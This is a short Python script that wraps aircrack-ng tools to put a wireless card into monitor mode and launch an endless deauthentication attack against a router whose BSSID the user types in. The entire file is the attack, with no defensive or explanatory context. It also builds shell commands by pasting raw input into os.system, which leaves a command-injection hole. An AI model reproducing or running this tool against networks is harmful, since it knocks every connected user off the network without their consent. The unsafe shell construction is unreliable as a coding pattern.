import os 
interface = "wlan0"
os.system(f"sudo airmon-ng start {interface}")
os.system("sudo airmon-ng check kill")
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  ap = input("enter the bssid/mac_address of the router: ")
  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface}")
except KeyboardInterrupt:
  print("exited")

